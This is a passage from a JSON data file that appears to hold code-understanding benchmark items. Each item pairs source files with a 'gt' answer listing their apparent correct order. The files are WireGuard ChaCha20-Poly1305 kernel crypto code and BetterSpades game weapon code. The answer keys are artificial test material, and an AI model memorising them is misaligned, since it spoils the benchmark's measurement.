sizeof(b));\n\treturn ret;\n}\n\nvoid xchacha20poly1305_encrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t       const u8 *ad, const size_t ad_len,\n\t\t\t       const u8 nonce[XCHACHA20POLY1305_NONCE_SIZE],\n\t\t\t       const u8 key[CHACHA20POLY1305_KEY_SIZE])\n{\n\tsimd_context_t simd_context;\n\tu32 derived_key[CHACHA20_KEY_WORDS] __aligned(16);\n\n\tsimd_get(&simd_context);\n\thchacha20(derived_key, nonce, key, &simd_context);\n\tcpu_to_le32_array(derived_key, ARRAY_SIZE(derived_key));\n\t__chacha20poly1305_encrypt(dst, src, src_len, ad, ad_len,\n\t\t\t\t   get_unaligned_le64(nonce + 16),\n\t\t\t\t   (u8 *)derived_key, &simd_context);\n\tmemzero_explicit(derived_key, CHACHA20POLY1305_KEY_SIZE);\n\tsimd_put(&simd_context);\n}\n\nbool xchacha20poly1305_decrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t       const u8 *ad, const size_t ad_len,\n\t\t\t       const u8 nonce[XCHACHA20POLY1305_NONCE_SIZE],\n\t\t\t       const u8 key[CHACHA20POLY1305_KEY_SIZE])\n{\n\tbool ret;\n\tsimd_context_t simd_context;\n\tu32 derived_key[CHACHA20_KEY_WORDS] __aligned(16);\n\n\tsimd_get(&simd_context);\n\thchacha20(derived_key, nonce, key, &simd_context);\n\tcpu_to_le32_array(derived_key, ARRAY_SIZE(derived_key));\n\tret = __chacha20poly1305_decrypt(dst, src, src_len, ad, ad_len,\n\t\t\t\t\t get_unaligned_le64(nonce + 16),\n\t\t\t\t\t (u8 *)derived_key, &simd_context);\n\tmemzero_explicit(derived_key, CHACHA20POLY1305_KEY_SIZE);\n\tsimd_put(&simd_context);\n\treturn ret;\n}\n\n#include \"selftest/chacha20poly1305.c\"\n\n#ifndef COMPAT_ZINC_IS_A_MODULE\nint __init chacha20poly1305_mod_init(void)\n#else\nstatic int __init mod_init(void)\n#endif\n{\n\tif (!selftest_run(\"chacha20poly1305\", chacha20poly1305_selftest,\n\t\t\t  NULL, 0))\n\t\treturn -ENOTRECOVERABLE;\n\treturn 0;\n}\n\n#ifdef COMPAT_ZINC_IS_A_MODULE\nstatic void __exit mod_exit(void)\n{\n}\n\nmodule_init(mod_init);\nmodule_exit(mod_exit);\nMODULE_LICENSE(\"GPL v2\");\nMODULE_DESCRIPTION(\"ChaCha20Poly1305 AEAD construction\");\nMODULE_AUTHOR(\"Jason A. Donenfeld <Jason@zx2c4.com>\");\n#endif\n",
        "gt": [
            "'wireguard-linux-compat/src/compat/simd-asm/include/asm/simd.h'",
            "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'",
            "'wireguard-linux-compat/src/crypto/include/zinc/chacha20poly1305.h'",
            "'wireguard-linux-compat/src/crypto/zinc/chacha20poly1305.c'"
        ]
    },
    {
        "files": [
            "'BetterSpades/src/aabb.h'",
            "'BetterSpades/src/player.h'",
            "'BetterSpades/src/weapon.c'",
            "'BetterSpades/src/tracer.h'"
        ],
        "content": "'BetterSpades/src/aabb.h'\n:\n\n#ifndef AABB_H\n#define AABB_H\n\n#include <stdbool.h>\n\ntypedef struct {\n\tunion {\n\t\tstruct {\n\t\t\tfloat min_x, min_y, min_z;\n\t\t};\n\t\tfloat min[3];\n\t};\n\tunion {\n\t\tstruct {\n\t\t\tfloat max_x, max_y, max_z;\n\t\t};\n\t\tfloat max[3];\n\t};\n} AABB;\n\ntypedef struct {\n\tunion {\n\t\tstruct {\n\t\t\tfloat x, y, z;\n\t\t};\n\t\tfloat coords[3];\n\t} origin;\n\tunion {\n\t\tstruct {\n\t\t\tfloat x, y, z;\n\t\t};\n\t\tfloat coords[3];\n\t} direction;\n} Ray;\n\nbool aabb_intersection(AABB* a, AABB* b);\nbool aabb_intersection_ray(AABB* a, Ray* r, float* distance);\nbool aabb_intersection_terrain(AABB* a, int miny);\nvoid aabb_set_size(AABB* a, float x, float y, float z);\nvoid aabb_set_center(AABB* a, float x, float y, float z);\nvoid aabb_render(AABB* a);\n\n#endif\n\n'BetterSpades/src/player.h'\n:\n\n#ifndef PLAYER_H\n#define PLAYER_H\n\n#include <stdbool.h>\n\n#include \"aabb.h\"\n#include \"network.h\"\n\n#define PLAYERS_MAX 256\n#define TEAM_1 0\n#define TEAM_2 1\n#define TEAM_SPECTATOR 255\n\nextern struct GameState {\n\tstruct Team {\n\t\tchar name[11];\n\t\tunsigned char red, green, blue;\n\t} team_1;\n\tstruct Team team_2;\n\tunsigned char gamemode_type;\n\tunion Gamemodes gamemode;\n\tstruct {\n\t\tunsigned char team_capturing, tent;\n\t\tfloat progress, rate, update;\n\t} progressbar;\n} gamestate;\n\n#define GAMEMODE_CTF 0\n#define GAMEMODE_TC 1\n\nextern int button_map[3];\n\nextern unsigned char local_player_id;\nextern unsigned char local_player_health;\nextern unsigned char local_player_blocks;\nextern unsigned char local_player_grenades;\nextern unsigned char local_player_ammo, local_player_ammo_reserved;\nextern unsigned char local_player_respawn_time;\nextern float local_player_death_time;\nextern unsigned char local_player_respawn_cnt_last;\nextern unsigned char local_player_newteam;\nextern unsigned char local_player_lasttool;\n\nextern float local_player_last_damage_timer;\nextern float local_player_last_damage_x;\nextern float local_player_last_damage_y;\nextern float local_player_last_damage_z;\n\nextern char local_player_drag_active;\nextern int local_player_drag_x;\nextern int local_player_drag_y;\nextern int local_player_drag_z;\n\nextern int player_intersection_type;\nextern int player_intersection_player;\nextern float player_intersection_dist;\n\nstruct player_intersection {\n\tbool head;\n\tbool torso;\n\tbool leg_left;\n\tbool leg_right;\n\tbool arms;\n\tunion {\n\t\tstruct {\n\t\t\tfloat head;\n\t\t\tfloat torso;\n\t\t\tfloat leg_left;\n\t\t\tfloat leg_right;\n\t\t\tfloat arms;\n\t\t};\n\t\tfloat values[5];\n\t} distance;\n};\n\nbool player_intersection_exists(struct player_intersection* s);\nint player_intersection_choose(struct player_intersection* s, float* distance);\n\nextern struct Player {\n\tchar name[17];\n\tstruct Position {\n\t\tfloat x, y, z;\n\t} pos;\n\tstruct Orientation {\n\t\tfloat x, y, z;\n\t} orientation;\n\tAABB bb_2d;\n\tstruct Orientation orientation_smooth;\n\tstruct Position gun_pos;\n\tstruct Position casing_dir;\n\tfloat gun_shoot_timer;\n\tint ammo, ammo_reserved;\n\tfloat spade_use_timer;\n\tunsigned char spade_used, spade_use_type;\n\tunsigned int score;\n\tunsigned char team, weapon, held_item;\n\tunsigned char alive, connected;\n\tfloat item_showup, item_disabled, items_show_start;\n\tunsigned char items_show;\n\tunion {\n\t\tunsigned int packed;\n\t\tstruct {\n\t\t\tunsigned char red, green, blue;\n\t\t};\n\t} block;\n\tstruct {\n\t\tunion {\n\t\t\tunsigned char packed;\n\t\t\tstruct {\n\t\t\t\tunsigned char up : 1;\n\t\t\t\tunsigned char down : 1;\n\t\t\t\tunsigned char left : 1;\n\t\t\t\tunsigned char right : 1;\n\t\t\t\tunsigned char jump : 1;\n\t\t\t\tunsigned char crouch : 1;\n\t\t\t\tunsigned char sneak : 1;\n\t\t\t\tunsigned char sprint : 1;\n\t\t\t};\n\t\t} keys;\n\t\tunion {\n\t\t\tunsigned char packed;\n\t\t\tstruct {\n\t\t\t\tunsigned char lmb : 1;\n\t\t\t\tunsigned char rmb : 1;\n\t\t\t\tfloat lmb_start, rmb_start;\n\t\t\t};\n\t\t} buttons;\n\t} input;\n\n\tstruct {\n\t\tunsigned char jump, airborne, wade;\n\t\tfloat lastclimb;\n\t\tstruct Velocity {\n\t\t\tfloat x, y, z;\n\t\t} velocity;\n\t\tstruct Position eye;\n\t} physics;\n\n\tstruct {\n\t\tfloat feet_started, feet_started_cycle;\n\t\tchar feet_cylce;\n\t\tfloat tool_started;\n\t} sound;\n} players[PLAYERS_MAX];\n\n\nvoid player_on_held_item_change(struct Player* p);\nint player_can_spectate(struct Player* p);\nfloat player_section_height(int section);\nvoid player_init(void);\nfloat player_height(const struct Player* p);\nfloat player_height2(const struct Player* p);\nvoid player_reposition(struct Player* p);\nvoid player_update(float dt, int locked);\nvoid player_render_all(void);\nvoid player_render(struct Player* p, int id);\nvoid player_collision(const struct Player* p, Ray* ray, struct player_intersection* intersects);\nvoid player_reset(struct Player* p);\nint player_move(struct Player* p, float fsynctics, int id);\nint player_uncrouch(struct Player* p);\n\n#endif\n\n'BetterSpades/src/weapon.c'\n:\n\n#include <math.h>\n\n#include \"window.h\"\n#include \"weapon.h\"\n#include \"camera.h\"\n#include \"particle.h\"\n#include \"map.h\"\n#include \"tracer.h\"\n#include \"hud.h\"\n\nfloat weapon_reload_start, weapon_last_shot;\nunsigned char weapon_reload_inprogress = 0;\n\nvoid weapon_update() {\n\tfloat t, delay = weapon_delay(players[local_player_id].weapon);\n\tint bullets = weapon_can_reload();\n\tswitch(players[local_player_id].weapon) {\n\t\tcase WEAPON_RIFLE: t = 2.5F; break;\n\t\tcase WEAPON_SMG: t = 2.5F; break;\n\t\tcase WEAPON_SHOTGUN: t = 0.5F * bullets; break;\n\t}\n\n\tif(weapon_reload_inprogress) {\n\t\tif(players[local_player_id].weapon == WEAPON_SHOTGUN) {\n\t\t\tif(window_time() - weapon_reload_start >= 0.5F) {\n\t\t\t\tlocal_player_ammo++;\n\t\t\t\tlocal_player_ammo_reserved--;\n\n\t\t\t\tstruct Sound_wav* snd;\n\t\t\t\tif(local_player_ammo < 6) {\n\t\t\t\t\tweapon_reload_start = window_time();\n\t\t\t\t\tsnd = &sound_shotgun_reload;\n\t\t\t\t} else {\n\t\t\t\t\tweapon_reload_inprogress = 0;\n\t\t\t\t\tsnd = &sound_shotgun_cock;\n\t\t\t\t}\n\t\t\t\tsound_create(SOUND_LOCAL, snd, 0.0F, 0.0F, 0.0F);\n\t\t\t}\n\t\t} else {\n\t\t\tif(window_time() - weapon_reload_start >= t) {\n\t\t\t\tlocal_player_ammo += bullets;\n\t\t\t\tlocal_player_ammo_reserved -= bullets;\n\t\t\t\tweapon_reload_inprogress = 0;\n\t\t\t}\n\t\t}\n\t\tif(players[local_player_id].held_item == TOOL_GUN) {\n\t\t\tplayers[local_player_id].item_disabled = window_time();\n\t\t\tplayers[local_player_id].items_show_start = window_time();\n\t\t\tplayers[local_player_id].items_show = 1;\n\t\t}\n\t} else {\n\t\tif(screen_current == SCREEN_NONE && window_time() - players[local_player_id].item_disabled >= 0.5F) {\n\t\t\tif(players[local_player_id].input.buttons.lmb && players[local_player_id].held_item == TOOL_GUN\n\t\t\t   && local_player_ammo > 0 && window_time() - weapon_last_shot >= delay) {\n\t\t\t\tweapon_shoot();\n\t\t\t\tlocal_player_ammo = max(local_player_ammo - 1, 0);\n\t\t\t\tweapon_last_shot = window_time();\n\t\t\t}\n\t\t}\n\t}\n}\n\nfloat weapon_recoil_anim(int gun) {\n\tswitch(gun) {\n\t\tcase WEAPON_RIFLE: return 0.3F;\n\t\tcase WEAPON_SMG: return 0.125F;\n\t\tcase WEAPON_SHOTGUN: return 0.75F;\n\t\tdefault: return 0.0F;\n\t}\n}\n\nint weapon_block_damage(int gun) {\n\tswitch(gun) {\n\t\tcase WEAPON_RIFLE: return 50;\n\t\tcase WEAPON_SMG: return 34;\n\t\tcase WEAPON_SHOTGUN: return 20;\n\t\tdefault: return 0;\n\t}\n}\n\nfloat weapon_delay(int gun) {\n\tswitch(gun) {\n\t\tcase WEAPON_RIFLE: return 0.5F;\n\t\tcase WEAPON_SMG: return 0.1F;\n\t\tcase WEAPON_SHOTGUN: return 1.0F;\n\t\tdefault: return 0.0F;\n\t}\n}\n\nstruct Sound_wav* weapon_sound(int gun) {\n\tswitch(gun) {\n\t\tcase WEAPON_RIFLE: return &sound_rifle_shoot;\n\t\tcase WEAPON_SMG: return &sound_smg_shoot;\n\t\tcase WEAPON_SHOTGUN: return &sound_shotgun_shoot;\n\t\tdefault: return NULL;\n\t}\n}\n\nstruct Sound_wav* weapon_sound_reload(int gun) {\n\tswitch(gun) {\n\t\tcase WEAPON_RIFLE: return &sound_rifle_reload;\n\t\tcase WEAPON_SMG: return &sound_smg_reload;\n\t\tcase WEAPON_SHOTGUN: return &sound_shotgun_reload;\n\t\tdefault: return NULL;\n\t}\n}\n\nvoid weapon_spread(struct Player* p, float* d) {\n\tfloat spread = 0.0F;\n\tswitch(p->weapon) {\n\t\tcase WEAPON_RIFLE: spread = 0.006F; break;\n\t\tcase WEAPON_SMG: spread = 0.012F; break;\n\t\tcase WEAPON_SHOTGUN: spread = 0.024F; break;\n\t}\n\td[0] += (ms_rand() - ms_rand()) / 16383.0F * spread * (p->input.buttons.rmb ? 0.5F : 1.0F)\n\t\t* ((p->input.keys.crouch && p->weapon != WEAPON_SHOTGUN) ? 0.5F : 1.0F);\n\td[1] += (ms_rand() - ms_rand()) / 16383.0F * spread * (p->input.buttons.rmb ? 0.5F : 1.0F)\n\t\t* ((p->input.keys.crouch && p->weapon != WEAPON_SHOTGUN) ? 0.5F : 1.0F);\n\td[2] += (ms_rand() - ms_rand()) / 16383.0F * spread * (p->input.buttons.rmb ? 0.5F : 1.0F)\n\t\t* ((p->input.keys.crouch && p->weapon != WEAPON_SHOTGUN) ? 0.5F : 1.0F);\n}\n\nvoid weapon_recoil(int gun, double* horiz_recoil, double* vert_recoil) {\n\tswitch(gun) {\n\t\tcase WEAPON_RIFLE:\n\t\t\t*horiz_recoil = 0.0001;\n\t\t\t*vert_recoil = 0.050000001;\n\t\t\tbreak;\n\t\tcase WEAPON_SMG:\n\t\t\t*horiz_recoil = 0.00005;\n\t\t\t*vert_recoil = 0.0125;\n\t\t\tbreak;\n\t\tcase WEAPON_SHOTGUN:\n\t\t\t*horiz_recoil = 0.0002;\n\t\t\t*vert_recoil = 0.1;\n\t\t\tbreak;\n\t\tdefault: *horiz_recoil = 0.0F; *vert_recoil = 0.0F;\n\t}\n}\n\nint weapon_ammo(int gun) {\n\tswitch(gun) {\n\t\tcase WEAPON_RIFLE: return 10;\n\t\tcase WEAPON_SMG: return 30;\n\t\tcase WEAPON_SHOTGUN: return 6;\n\t\tdefault: return 0;\n\t}\n}\n\nint weapon_ammo_reserved(int gun) {\n\tswitch(gun) {\n\t\tcase WEAPON_RIFLE: return 50;\n\t\tcase WEAPON_SMG: return 120;\n\t\tcase WEAPON_SHOTGUN: return 48;\n\t\tdefault: return 0;\n\t}\n}\n\nstruct kv6_t* weapon_casing(int gun) {\n\tswitch(gun) {\n\t\tcase WEAPON_RIFLE: return &model_semi_casing;\n\t\tcase WEAPON_SMG: return &model_smg_casing;\n\t\tcase WEAPON_SHOTGUN: return &model_shotgun_casing;\n\t\tdefault: return NULL;\n\t}\n}\n\nvoid weapon_set(bool restock) {\n\tif(!restock)\n\t\tlocal_player_ammo = weapon_ammo(players[local_player_id].weapon);\n\n\tlocal_player_ammo_reserved = weapon_ammo_reserved(players[local_player_id].weapon);\n\tweapon_reload_inprogress = 0;\n}\n\nvoid weapon_reload() {\n\tif(local_player_ammo_reserved == 0 || weapon_reload_inprogress || !weapon_can_reload())\n\t\treturn;\n\n\tweapon_reload_start = window_time();\n\tweapon_reload_inprogress = 1;\n\n\tsound_create(SOUND_LOCAL, weapon_sound_reload(players[local_player_id].weapon), players[local_player_id].pos.x,\n\t\t\t\t players[local_player_id].pos.y, players[local_player_id].pos.z);\n\n\tstruct PacketWeaponReload reloadp;\n\treloadp.player_id = local_player_id;\n\treloadp.ammo = local_player_ammo;\n\treloadp.reserved = local_player_ammo_reserved;\n\tnetwork_send(PACKET_WEAPONRELOAD_ID, &reloadp, sizeof(reloadp));\n}\n\nvoid weapon_reload_abort() {\n\tif(weapon_reload_inprogress && players[local_player_id].weapon == WEAPON_SHOTGUN) {\n\t\tweapon_reload_inprogress = 0;\n\t\tplayers[local_player_id].items_show = 0;\n\t\tplayers[local_player_id].item_showup = 0;\n\t\tplayers[local_player_id].item_disabled = 0;\n\t}\n}\n\nint weapon_reloading() {\n\treturn weapon_reload_inprogress;\n}\n\nint weapon_can_reload() {\n\tint mag_size = weapon_ammo(players[local_player_id].weapon);\n\treturn max(min(min(local_player_ammo_reserved, mag_size), mag_size - local_player_ammo), 0);\n}\n\nvoid weapon_shoot() {\n\n\n\n\n\tfor(int i = 0; i < ((players[local_player_id].weapon == WEAPON_SHOTGUN) ? 8 : 1); i++) {\n\t\tfloat o[3] = {players[local_player_id].orientation.x, players[local_player_id].orientation.y,\n\t\t\t\t\t  players[local_player_id].orientation.z};\n\n\t\tweapon_spread(&players[local_player_id], o);\n\n\t\tstruct Camera_HitType hit;\n\t\tcamera_hit(&hit, local_player_id, players[local_player_id].physics.eye.x,\n\t\t\t\t   players[local_player_id].physics.eye.y + player_height(&players[local_player_id]),\n\t\t\t\t   players[local_player_id].physics.eye.z, o[0], o[1], o[2], 128.0F);\n\n\t\tif(players[local_player_id].input.buttons.packed != network_buttons_last) {\n\t\t\tstruct PacketWeaponInput in;\n\t\t\tin.player_id = local_player_id;\n\t\t\tin.primary = players[local_player_id].input.buttons.lmb;\n\t\t\tin.secondary = players[local_player_id].input.buttons.rmb;\n\t\t\tnetwork_send(PACKET_WEAPONINPUT_ID, &in, sizeof(in));\n\n\t\t\tnetwork_buttons_last = players[local_player_id].input.buttons.packed;\n\t\t}\n\n\t\tstruct PacketOrientationData orient;\n\t\torient.x = players[local_player_id].orientation.x;\n\t\torient.y = players[local_player_id].orientation.z;\n\t\torient.z = -players[local_player_id].orientation.y;\n\t\tnetwork_send(PACKET_ORIENTATIONDATA_ID, &orient, sizeof(orient));\n\n\t\tif(hit.y == 0 && hit.type == CAMERA_HITTYPE_BLOCK)\n\t\t\thit.type = CAMERA_HITTYPE_NONE;\n\t\tswitch(hit.type) {\n\t\t\tcase CAMERA_HITTYPE_PLAYER: {\n\t\t\t\tsound_create_sticky((hit.player_section == HITTYPE_HEAD) ? &sound_spade_whack : &sound_hitplayer,\n\t\t\t\t\t\t\t\t\tplayers + hit.player_id, hit.player_id);\n\t\t\t\tparticle_create(0x0000FF, players[hit.player_id].physics.eye.x,\n\t\t\t\t\t\t\t\tplayers[hit.player_id].physics.eye.y + player_section_height(hit.player_section),\n\t\t\t\t\t\t\t\tplayers[hit.player_id].physics.eye.z, 3.5F, 1.0F, 8, 0.1F, 0.4F);\n\n\t\t\t\tstruct PacketHit h;\n\t\t\t\th.player_id = hit.player_id;\n\t\t\t\th.hit_type = hit.player_section;\n\t\t\t\tnetwork_send(PACKET_HIT_ID, &h, sizeof(h));\n\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase CAMERA_HITTYPE_BLOCK:\n\t\t\t\tmap_damage(hit.x, hit.y, hit.z, weapon_block_damage(players[local_player_id].weapon));\n\t\t\t\tif(map_damage_action(hit.x, hit.y, hit.z) && hit.y > 1) {\n\t\t\t\t\tstruct PacketBlockAction blk;\n\t\t\t\t\tblk.action_type = ACTION_DESTROY;\n\t\t\t\t\tblk.player_id = local_player_id;\n\t\t\t\t\tblk.x = hit.x;\n\t\t\t\t\tblk.y = hit.z;\n\t\t\t\t\tblk.z = 63 - hit.y;\n\t\t\t\t\tnetwork_send(PACKET_BLOCKACTION_ID, &blk, sizeof(blk));\n\n\t\t\t\t} else {\n\t\t\t\t\tparticle_create(map_get(hit.x, hit.y, hit.z), hit.xb + 0.5F, hit.yb + 0.5F, hit.zb + 0.5F, 2.5F,\n\t\t\t\t\t\t\t\t\t1.0F, 4, 0.1F, 0.25F);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t}\n\n\t\ttracer_pvelocity(o, &players[local_player_id]);\n\t\ttracer_add(players[local_player_id].weapon, players[local_player_id].physics.eye.x,\n\t\t\t\t   players[local_player_id].physics.eye.y + player_height(&players[local_player_id]),\n\t\t\t\t   players[local_player_id].physics.eye.z, o[0], o[1], o[2]);\n\t}\n\n\tdouble horiz_recoil, vert_recoil;\n\tweapon_recoil(players[local_player_id].weapon, &horiz_recoil, &vert_recoil);\n\n\tlong triangle_wave = (long)(window_time() * 1000) & 511;\n\thoriz_recoil *= ((double)triangle_wave - 255.5);\n\n\tif(((long)(window_time() * 1000) & 1023) < 512) {\n\t\thoriz_recoil *= -1.0;\n\t}\n\n\tif((players[local_player_id].input.keys.up || players[local_player_id].input.keys.down\n\t\t|| players[local_player_id].input.keys.left || players[local_player_id].input.keys.right)\n\t   && !players[local_player_id].input.buttons.rmb) {\n\t\tvert_recoil *= 2.0;\n\t\thoriz_recoil *= 2.0;\n\t}\n\tif(players[local_player_id].physics.airborne) {\n\t\tvert_recoil *= 2.0;\n\t\thoriz_recoil *= 2.0;\n\t} else {\n\t\tif(players[local_player_id].input.keys.crouch) {\n\t\t\tvert_recoil *= 0.5;\n\t\t\thoriz_recoil *= 0.5;\n\t\t}\n\t}\n\n\n\thoriz_recoil *= sqrt(1.0F\n\t\t\t\t\t\t - players[local_player_id].orientation.y * players[local_player_id].orientation.y\n\t\t\t\t\t\t\t * players[local_player_id].orientation.y * players[local_player_id].orientation.y);\n\n\tcamera_rot_x += horiz_recoil;\n\tcamera_rot_y -= vert_recoil;\n\n\tcamera_overflow_adjust();\n\n\tsound_create(SOUND_LOCAL, weapon_sound(players[local_player_id].weapon), players[local_player_id].pos.x,\n\t\t\t\t players[local_player_id].pos.y, players[local_player_id].pos.z);\n\tparticle_create_casing(&players[local_player_id]);\n}\n\n'BetterSpades/src/tracer.h'\n:\n\n#ifndef TRACER_H\n#define TRACER_H\n\n#include \"aabb.h\"\n#include \"player.h\"\n#include \"camera.h\"\n\nstruct Tracer {\n\tstruct Camera_HitType hit;\n\tfloat x, y, z;\n\tRay r;\n\tint type;\n\tfloat created;\n};\n\nvoid tracer_minimap(int large, float scalef, float minimap_x, float minimap_y);\nvoid tracer_pvelocity(float* o, struct Player* p);\nvoid tracer_add(int type, float x, float y, float z, float dx, float dy, float dz);\nvoid tracer_update(float dt);\nvoid tracer_render(void);\nvoid tracer_init(void);\n\n#endif\n",
        "gt": [
            "'BetterSpades/src/aabb.h'",
            "'BetterSpades/src/player.h'",
            "'BetterSpades/src/tracer.h'",
            "'BetterSpades/src/weapon.c'"
        ]
    },
    {
        "files": [
            "'wireguard-linux-compat/src/crypto/include/zinc/poly1305.h'",
            "'wireguard-linux-compat/src/crypto/zinc/chacha20poly1305.c'",
            "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'",
            "'wireguard-linux-compat/src/compat/simd-asm/include/asm/simd.h'",
            "'wireguard-linux-compat/src/compat/fpu-x86/include/asm/fpu/api.h'"
        ],
        "content": "'wireguard-linux-compat/src/crypto/include/zinc/poly1305.h'\n:\n\n\n#ifndef _ZINC_POLY1305_H\n#define _ZINC_POLY1305_H\n\n#include <linux/simd.h>\n#include <linux/types.h>\n\nenum poly1305_lengths {\n\tPOLY1305_BLOCK_SIZE = 16,\n\tPOLY1305_KEY_SIZE = 32,\n\tPOLY1305_MAC_SIZE = 16\n};\n\nstruct poly1305_ctx {\n\tu8 opaque[24 * sizeof(u64)];\n\tu32 nonce[4];\n\tu8 data[POLY1305_BLOCK_SIZE];\n\tsize_t num;\n} __aligned(8);\n\nvoid poly1305_init(struct poly1305_ctx *ctx, const u8 key[POLY1305_KEY_SIZE]);\nvoid poly1305_update(struct poly1305_ctx *ctx, const u8 *input, size_t len,\n\t\t     simd_context_t *simd_context);\nvoid poly1305_final(struct poly1305_ctx *ctx, u8 mac[POLY1305_MAC_SIZE],\n\t\t    simd_context_t *simd_context);\n\n#endif\n\n'wireguard-linux-compat/src/crypto/zinc/chacha20poly1305.c'\n:\n\n\n#include <zinc/chacha20poly1305.h>\n#include <zinc/chacha20.h>\n#include <zinc/poly1305.h>\n#include \"selftest/run.h\"\n\n#include <asm/unaligned.h>\n#include <linux/kernel.h>\n#include <linux/module.h>\n#include <linux/init.h>\n#include <crypto/scatterwalk.h>\n\nstatic const u8 pad0[CHACHA20_BLOCK_SIZE] = { 0 };\n\nstatic inline void\n__chacha20poly1305_encrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t   const u8 *ad, const size_t ad_len, const u64 nonce,\n\t\t\t   const u8 key[CHACHA20POLY1305_KEY_SIZE],\n\t\t\t   simd_context_t *simd_context)\n{\n\tstruct poly1305_ctx poly1305_state;\n\tstruct chacha20_ctx chacha20_state;\n\tunion {\n\t\tu8 block0[POLY1305_KEY_SIZE];\n\t\t__le64 lens[2];\n\t} b = { { 0 } };\n\n\tchacha20_init(&chacha20_state, key, nonce);\n\tchacha20(&chacha20_state, b.block0, b.block0, sizeof(b.block0),\n\t\t simd_context);\n\tpoly1305_init(&poly1305_state, b.block0);\n\n\tpoly1305_update(&poly1305_state, ad, ad_len, simd_context);\n\tpoly1305_update(&poly1305_state, pad0, (0x10 - ad_len) & 0xf,\n\t\t\tsimd_context);\n\n\tchacha20(&chacha20_state, dst, src, src_len, simd_context);\n\n\tpoly1305_update(&poly1305_state, dst, src_len, simd_context);\n\tpoly1305_update(&poly1305_state, pad0, (0x10 - src_len) & 0xf,\n\t\t\tsimd_context);\n\n\tb.lens[0] = cpu_to_le64(ad_len);\n\tb.lens[1] = cpu_to_le64(src_len);\n\tpoly1305_update(&poly1305_state, (u8 *)b.lens, sizeof(b.lens),\n\t\t\tsimd_context);\n\n\tpoly1305_final(&poly1305_state, dst + src_len, simd_context);\n\n\tmemzero_explicit(&chacha20_state, sizeof(chacha20_state));\n\tmemzero_explicit(&b, sizeof(b));\n}\n\nvoid chacha20poly1305_encrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t      const u8 *ad, const size_t ad_len,\n\t\t\t      const u64 nonce,\n\t\t\t      const u8 key[CHACHA20POLY1305_KEY_SIZE])\n{\n\tsimd_context_t simd_context;\n\n\tsimd_get(&simd_context);\n\t__chacha20poly1305_encrypt(dst, src, src_len, ad, ad_len, nonce, key,\n\t\t\t\t   &simd_context);\n\tsimd_put(&simd_context);\n}\n\nbool chacha20poly1305_encrypt_sg_inplace(struct scatterlist *src,\n\t\t\t\t\t const size_t src_len,\n\t\t\t\t\t const u8 *ad, const size_t ad_len,\n\t\t\t\t\t const u64 nonce,\n\t\t\t\t\t const u8 key[CHACHA20POLY1305_KEY_SIZE],\n\t\t\t\t\t simd_context_t *simd_context)\n{\n\tstruct poly1305_ctx poly1305_state;\n\tstruct chacha20_ctx chacha20_state;\n\tstruct sg_mapping_iter miter;\n\tsize_t partial = 0;\n\tssize_t sl;\n\tunion {\n\t\tu8 chacha20_stream[CHACHA20_BLOCK_SIZE];\n\t\tu8 block0[POLY1305_KEY_SIZE];\n\t\tu8 mac[POLY1305_MAC_SIZE];\n\t\t__le64 lens[2];\n\t} b __aligned(16) = { { 0 } };\n\n\tif (WARN_ON(src_len > INT_MAX))\n\t\treturn false;\n\n\tchacha20_init(&chacha20_state, key, nonce);\n\tchacha20(&chacha20_state, b.block0, b.block0, sizeof(b.block0),\n\t\t simd_context);\n\tpoly1305_init(&poly1305_state, b.block0);\n\n\tpoly1305_update(&poly1305_state, ad, ad_len, simd_context);\n\tpoly1305_update(&poly1305_state, pad0, (0x10 - ad_len) & 0xf,\n\t\t\tsimd_context);\n\n\tsg_miter_start(&miter, src, sg_nents(src), SG_MITER_TO_SG | SG_MITER_ATOMIC);\n\tfor (sl = src_len; sl > 0 && sg_miter_next(&miter); sl -= miter.length) {\n\t\tu8 *addr = miter.addr;\n\t\tsize_t length = min_t(size_t, sl, miter.length);\n\n\t\tif (unlikely(partial)) {\n\t\t\tsize_t l = min(length, CHACHA20_BLOCK_SIZE - partial);\n\n\t\t\tcrypto_xor(addr, b.chacha20_stream + partial, l);\n\t\t\tpartial = (partial + l) & (CHACHA20_BLOCK_SIZE - 1);\n\n\t\t\taddr += l;\n\t\t\tlength -= l;\n\t\t}\n\n\t\tif (likely(length >= CHACHA20_BLOCK_SIZE || length == sl)) {\n\t\t\tsize_t l = length;\n\n\t\t\tif (unlikely(length < sl))\n\t\t\t\tl &= ~(CHACHA20_BLOCK_SIZE - 1);\n\t\t\tchacha20(&chacha20_state, addr, addr, l, simd_context);\n\t\t\taddr += l;\n\t\t\tlength -= l;\n\t\t}\n\n\t\tif (unlikely(length > 0)) {\n\t\t\tchacha20(&chacha20_state, b.chacha20_stream, pad0,\n\t\t\t\t CHACHA20_BLOCK_SIZE, simd_context);\n\t\t\tcrypto_xor(addr, b.chacha20_stream, length);\n\t\t\tpartial = length;\n\t\t}\n\n\t\tpoly1305_update(&poly1305_state, miter.addr,\n\t\t\t\tmin_t(size_t, sl, miter.length), simd_context);\n\n\t\tsimd_relax(simd_context);\n\t}\n\n\tpoly1305_update(&poly1305_state, pad0, (0x10 - src_len) & 0xf,\n\t\t\tsimd_context);\n\n\tb.lens[0] = cpu_to_le64(ad_len);\n\tb.lens[1] = cpu_to_le64(src_len);\n\tpoly1305_update(&poly1305_state, (u8 *)b.lens, sizeof(b.lens),\n\t\t\tsimd_context);\n\n\tif (likely(sl <= -POLY1305_MAC_SIZE))\n\t\tpoly1305_final(&poly1305_state, miter.addr + miter.length + sl,\n\t\t\t       simd_context);\n\n\tsg_miter_stop(&miter);\n\n\tif (unlikely(sl > -POLY1305_MAC_SIZE)) {\n\t\tpoly1305_final(&poly1305_state, b.mac, simd_context);\n\t\tscatterwalk_map_and_copy(b.mac, src, src_len, sizeof(b.mac), 1);\n\t}\n\n\tmemzero_explicit(&chacha20_state, sizeof(chacha20_state));\n\tmemzero_explicit(&b, sizeof(b));\n\treturn true;\n}\n\nstatic inline bool\n__chacha20poly1305_decrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t   const u8 *ad, const size_t ad_len, const u64 nonce,\n\t\t\t   const u8 key[CHACHA20POLY1305_KEY_SIZE],\n\t\t\t   simd_context_t *simd_context)\n{\n\tstruct poly1305_ctx 